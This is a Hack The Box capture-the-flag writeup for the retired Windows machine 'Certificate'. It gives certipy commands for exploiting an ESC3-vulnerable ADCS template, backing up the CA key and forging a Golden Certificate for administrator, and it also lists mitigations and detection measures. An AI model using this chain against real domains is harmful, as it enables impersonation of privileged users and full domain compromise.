---
machine: Certificate
os: Windows
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [windows, active-directory, adcs, esc3, golden-certificate, efs]
---

# Certificate — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

A domain controller with ADCS exposes an ESC3-vulnerable template. An enrollment-agent certificate is obtained, a certificate is requested on behalf of a privileged user, and a Golden Certificate grants administrator access to decrypt EFS.

## Enumeration

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p53,80,88,135,139,389,443,445,464,636,3268,5985,9389 <IP>
```

Add `certificate.htb` to hosts. Enumerate users, SMB and the web service. Initial credentials authenticate to the domain.

## Initial access

With the credentials, enumerate ADCS:

```bash
certipy find -u <user>@certificate.htb -p '<password>' -dc-ip <IP> -vulnerable
```

The CA `Certificate-LTD-CA` and template `Delegated-CRA` are vulnerable to ESC3.

## Lateral movement

Request an enrollment-agent certificate:

```bash
certipy req -u <user>@certificate.htb -p '<password>' -ca Certificate-LTD-CA -template Delegated-CRA -dc-ip <IP>
```

Use it to request a certificate on behalf of a more privileged user:

```bash
certipy req -u <user>@certificate.htb -p '<password>' -ca Certificate-LTD-CA -template User -on-behalf-of 'certificate\\<target>' -pfx agent.pfx -dc-ip <IP>
```

Authenticate with the PFX and obtain a ticket/session for the target.

## Escalation to administrator

Extract the CA private key and forge a Golden Certificate for administrator:

```bash
certipy ca -backup -u <user>@certificate.htb -p '<password>' -dc-ip <IP>
certipy forge -ca-pfx ca.pfx -upn administrator@certificate.htb -subject 'CN=Administrator'
```

Use the forged certificate to access the DC. The root flag is EFS-protected; use the CA/administrator key to decrypt it.

## Evidence

- `certipy find -vulnerable` output.
- ESC3 template and issued certificates (redacted).
- Golden Certificate and DC access.
- EFS decryption and redacted flag.

## Lessons learned

- ESC3 allows acting as an enrollment agent.
- A compromised CA can forge identities.
- Golden Certificates survive password changes.
- EFS is not protection if the attacker controls the CA.

## Mitigation and detection

- Review templates and enrollment permissions.
- Remove `Enroll` for unneeded agents.
- Protect the CA key with an HSM.
- Monitor issuance and certificate-based logons.

## References

- <https://www.hackthebox.com/machines/certificate>
- <https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation>
- <https://attack.mitre.org/techniques/T1649/>
